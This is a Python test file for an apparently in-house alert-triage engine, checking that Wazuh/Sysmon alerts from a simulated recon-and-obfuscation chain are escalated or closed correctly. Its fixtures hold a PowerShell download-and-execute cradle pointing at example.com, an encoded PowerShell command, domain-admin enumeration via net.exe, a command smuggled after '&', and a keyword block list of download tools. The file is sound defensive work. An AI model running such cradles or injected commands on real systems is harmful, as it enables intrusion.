"""A recon-and-obfuscation chain on one endpoint: caught, with the noise closed.

    python -m pytest -q tests/test_demo_chain.py

This mirrors an adversary-simulation run on a laptop: read-only discovery
(net.exe) that a SIEM rates low, and two obfuscation steps (an encoded
PowerShell command and a download cradle) whose payloads are harmless but
whose shape is what matters. The engine must close the discovery as noise and
escalate the two obfuscation steps on the command line alone, whatever rule
level Wazuh gave them, then group them into one incident on the host.

It also pins a connector gap found while building the demo: PowerShell
script-block logging records the code in scriptBlockText, not commandLine, so
a cradle logged that way would be invisible if only commandLine were read.
"""
import base64
import datetime as dt

from app.connectors import wazuh
from app.connectors.sources import normalize
from app.engine import signals
from app.orchestrator import process_batch

CLIENT = "Greenvale Co-operative Bank"
HOST = "LAPTOP-R2T63QI9"
T0 = dt.datetime(2026, 11, 24, 11, 0, 0)


def _sysmon(sec, rid, level, desc, eventdata, groups=("sysmon", "sysmon_eid1_detections", "windows")):
    t = T0 + dt.timedelta(seconds=sec)
    return {"source": "wazuh", "client": CLIENT, "raw": {
        "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"), "id": f"{int(t.timestamp())}.{rid}{sec}",
        "rule": {"id": rid, "level": level, "description": desc, "groups": list(groups)},
        "agent": {"id": "001", "name": HOST, "ip": "192.168.1.7"}, "manager": {"name": "wazuh-demo"},
        "decoder": {"name": "windows_eventchannel"}, "location": "EventChannel",
        "data": {"win": {"system": {"eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
                                     "computer": HOST}, "eventdata": eventdata}}}}


def discovery(sec, cmd):
    return _sysmon(sec, "92031", 3, "Discovery activity executed",
                   {"commandLine": cmd, "image": "C:\\Windows\\System32\\net.exe",
                    "originalFileName": "net.EXE", "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "user": f"{HOST}\\akash"})


def encoded_ps(sec):
    payload = base64.b64encode("Get-Date".encode("utf-16-le")).decode()
    return _sysmon(sec, "92057", 12, "Powershell executed a base64 encoded command",
                   {"commandLine": f"powershell.exe -EncodedCommand {payload}",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "originalFileName": "PowerShell.EXE", "user": f"{HOST}\\akash"})


def cradle_scriptblock(sec):
    """A download cradle as PowerShell SCRIPT-BLOCK logging records it: the code
    is in scriptBlockText, and there is no commandLine."""
    return _sysmon(sec, "91837", 4, 'Powershell executed "Invoke-Expresion". Possible string execution as code',
                   {"scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://example.com/x')",
                    "user": f"{HOST}\\akash"}, groups=("windows", "powershell"))


def test_scriptblock_text_is_read_as_the_command_line():
    a = normalize("wazuh", cradle_scriptblock(0)["raw"], CLIENT)
    assert "downloadstring" in (a.indicators.get("cmdline") or "").lower()
    assert "PowerShell download cradle" in signals.matched_behaviours(a)


def test_the_chain_is_caught_and_the_recon_is_closed():
    chain = [discovery(0, "net  user"), discovery(20, 'net  group "domain admins" /domain'),
             discovery(40, "net  localgroup administrators"), encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    v = {a["alert_id"]: r["verdicts"][a["alert_id"]] for a in r["alerts"]}
    esc = [a for a in r["alerts"] if v[a["alert_id"]]["escalate"]]
    closed = [a for a in r["alerts"] if not v[a["alert_id"]]["escalate"]]
    assert len(esc) == 2, "the two obfuscation steps escalate"
    assert len(closed) == 3, "the three discovery alerts are closed as noise"
    assert all(v[a["alert_id"]]["closure_code"] == "BENIGN_EXPECTED" for a in closed)


def test_the_two_obfuscation_steps_group_into_one_incident():
    chain = [discovery(0, "net  user"), encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    assert r["metrics"]["incident_count"] == 1
    inc = r["incidents"][0]
    assert inc["size"] == 2 and inc["key"] == HOST


def test_the_incident_is_reportable_and_typed():
    from app.engine import certin
    chain = [encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    by = {a["alert_id"]: a for a in r["alerts"]}
    inc = r["incidents"][0]
    members = [{"alert": by[i], "verdict": r["verdicts"][i]} for i in inc["alert_ids"]]
    assert certin.is_reportable_candidate(members)
    types = [t["type"] for t in certin.classify(members)]
    assert any("Malicious code" in t for t in types)


def test_the_host_is_proposed_for_isolation():
    chain = [encoded_ps(90)]
    r = process_batch(chain)
    acts = [x for v in r["actions"].values() for x in v]
    assert any(x["action_type"] == "isolate_host" and x["target"] == HOST for x in acts)


def test_powershell_policy_probe_file_is_not_a_critical_malware_drop():
    """Stock Wazuh rule 92213 rates PowerShell's own execution-policy probe
    file a level-15 'executable dropped in a folder used by malware'. It is
    created and deleted on every PowerShell launch. Triagle must close it."""
    probe = _sysmon(0, "92213", 15, "Executable file dropped in folder commonly used by malware",
                    {"targetFilename": "C:\\Users\\akash\\AppData\\Local\\Temp\\__PSScriptPolicyTest_lpocpbf5.ccl.ps1",
                     "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                    groups=("sysmon", "sysmon_eid11", "windows"))
    r = process_batch([probe])
    v = r["verdicts"][r["alerts"][0]["alert_id"]]
    assert not v["escalate"] and v["closure_code"] == "BENIGN_KNOWN_TOOL"
    assert v["tuning_recommendation"]


def test_the_policy_probe_does_not_corroborate_or_join_an_incident():
    """At level 15 it would otherwise look like strong corroboration. It must
    not raise a neighbouring alert or pad an incident."""
    import datetime as _dt
    probes = [_sysmon(i, "92213", 15, "Executable file dropped in folder commonly used by malware",
                      {"targetFilename": f"C:\\Users\\akash\\AppData\\Local\\Temp\\__PSScriptPolicyTest_{i}aaaa.{i}bb.ps1",
                       "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                      groups=("sysmon", "sysmon_eid11", "windows")) for i in range(4)]
    r = process_batch(probes)
    assert r["metrics"]["escalated"] == 0 and r["metrics"]["incident_count"] == 0


def test_a_real_drop_in_temp_is_still_escalated():
    """The recognition is the specific probe signature, not 'anything in Temp'.
    A different executable dropped in Temp must still be caught."""
    drop = _sysmon(0, "92213", 15, "Executable file dropped in folder commonly used by malware",
                   {"targetFilename": "C:\\Users\\akash\\AppData\\Local\\Temp\\svchost_update.exe",
                    "image": "C:\\Users\\akash\\Downloads\\invoice.exe"},
                   groups=("sysmon", "sysmon_eid11", "windows"))
    r = process_batch([drop])
    assert r["verdicts"][r["alerts"][0]["alert_id"]]["escalate"]


# ---- Windows' own scheduled database merge -----------------------------------

def _sdbinst(sec, cmd, image="C:\\Windows\\System32\\sdbinst.exe"):
    return _sysmon(sec, "92058", 12, "Application Compatibility Database launched",
                   {"commandLine": cmd, "image": image, "originalFileName": "sdbinst.exe",
                    "parentImage": "C:\\Windows\\System32\\svchost.exe", "user": "NT AUTHORITY\\SYSTEM"})


def test_windows_own_database_merge_is_closed_not_raised_every_hour():
    """Windows runs "sdbinst.exe -m -bg" from a scheduled task, about hourly.
    The stock rule flags the program name and rates it high, so a laptop left
    on raises the same alert all day. No database file is named: nothing is
    being installed."""
    for cmd in ("C:\\WINDOWS\\system32\\sdbinst.exe -m -bg", '"C:\\Windows\\System32\\sdbinst.exe" -m -bg',
                "sdbinst.exe -m -bg", "C:\\WINDOWS\\system32\\sdbinst.exe -mm"):
        r = process_batch([_sdbinst(0, cmd)])
        v = r["verdicts"][r["alerts"][0]["alert_id"]]
        assert not v["escalate"] and v["closure_code"] == "BENIGN_KNOWN_TOOL", cmd
        assert "names no database file" in v["reasoning"] and v["tuning_recommendation"]
    day = process_batch([_sdbinst(3600 * i, "C:\\WINDOWS\\system32\\sdbinst.exe -m -bg") for i in range(10)])
    assert day["metrics"]["escalated"] == 0 and day["metrics"]["incident_count"] == 0


def test_installing_a_compatibility_database_is_still_raised():
    """Only the exact merge command is recognised. Naming a database file,
    adding anything else, or running a copy from another folder is not."""
    raised = [
        _sdbinst(0, "C:\\Windows\\System32\\sdbinst.exe -q C:\\Users\\akash\\AppData\\Local\\Temp\\fix.sdb"),
        _sdbinst(1, "sdbinst.exe C:\\ProgramData\\app.sdb"),
        _sdbinst(2, "sdbinst.exe -m -bg -q C:\\ProgramData\\app.sdb"),
        _sdbinst(3, "sdbinst.exe -m -bg & calc.exe"),
        _sdbinst(4, "C:\\Users\\Public\\sdbinst.exe -m -bg", image="C:\\Users\\Public\\sdbinst.exe"),
        _sdbinst(5, "sdbinst.exe -m -bg", image="C:\\Users\\Public\\sdbinst.exe"),
    ]
    for item in raised:
        r = process_batch([item])
        v = r["verdicts"][r["alerts"][0]["alert_id"]]
        assert v["escalate"], item["raw"]["data"]["win"]["eventdata"]["commandLine"]


# ---- a browser updating one of its own components ----------------------------

EDGE = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
UNPACK = "C:\\Users\\User\\AppData\\Local\\Temp\\msedge_chrome_Unpacker_BeginUnzipping25284_2098831803\\domain_actions.dll"


def _drop(target, image, sec=0):
    return _sysmon(sec, "92213", 15, "Executable file dropped in folder commonly used by malware",
                   {"targetFilename": target, "image": image}, groups=("sysmon", "sysmon_eid11_detections", "windows"))


def test_a_browser_unpacking_its_own_component_is_not_a_critical_malware_drop():
    """Seen on a real laptop: Edge updated a component and the stock rule
    rated the unpacked DLL level 15. Triagle raised it as high and proposed
    isolating the laptop. It is the browser's updater doing its job."""
    cases = [
        (UNPACK, EDGE),
        ("C:\\Users\\a\\AppData\\Local\\Temp\\chrome_Unpacker_BeginUnzipping9120_1554\\widevinecdm.dll",
         "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
        ("C:\\Users\\a\\AppData\\Local\\Temp\\chrome_Unpacker_BeginUnzipping77_1\\x.dll",
         "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
    ]
    for target, image in cases:
        r = process_batch([_drop(target, image)])
        v = r["verdicts"][r["alerts"][0]["alert_id"]]
        assert not v["escalate"] and v["closure_code"] == "BENIGN_KNOWN_TOOL", target
        assert "browser" in v["reasoning"] and v["tuning_recommendation"]
        assert not r["actions"], "and nothing proposes isolating the machine"


def test_the_folder_name_alone_is_not_enough():
    """Both must hold: the unpack folder, and the installed browser as the
    writer. Anything else is still raised."""
    raised = [
        _drop(UNPACK, "C:\\Users\\User\\Downloads\\invoice.exe"),                        # something else used the folder name
        _drop(UNPACK, "C:\\Users\\User\\AppData\\Local\\Temp\\msedge.exe"),               # a file named like the browser, elsewhere
        _drop("C:\\Users\\User\\AppData\\Local\\Temp\\update.dll", EDGE),                  # the browser, but not its unpack folder
        _drop(UNPACK, ""),                                                                 # the alert does not say who wrote it
    ]
    for item in raised:
        r = process_batch([item])
        v = r["verdicts"][r["alerts"][0]["alert_id"]]
        assert v["escalate"], item["raw"]["data"]["win"]["eventdata"]


# ---- the double-click launcher for the detection test ------------------------

def test_the_launcher_only_runs_the_test_script_beside_it():
    """The demo is run by double-clicking a file, not by typing commands. The
    launcher must do one thing: run recon_chain.ps1 from its own folder. It
    downloads nothing and is plain ASCII with Windows line endings, so cmd.exe
    reads it the same on any machine."""
    import os
    here = os.path.join(os.path.dirname(os.path.dirname(__file__)), "scripts", "demo")
    raw = open(os.path.join(here, "triagle_detection_test.cmd"), "rb").read()
    raw.decode("ascii")
    assert b"\r\n" in raw and b"\n" not in raw.replace(b"\r\n", b"")
    lines = [x for x in raw.decode().split("\r\n") if x and not x.lower().startswith(("rem ", "@echo", "title "))]
    runs = [x for x in lines if "powershell" in x.lower()]
    assert runs == ['powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0recon_chain.ps1"']
    lowered = raw.decode().lower()
    assert not any(w in lowered for w in ("http", "curl", "invoke-webrequest", "bitsadmin", "certutil", "del ", "reg "))
    assert os.path.exists(os.path.join(here, "recon_chain.ps1"))
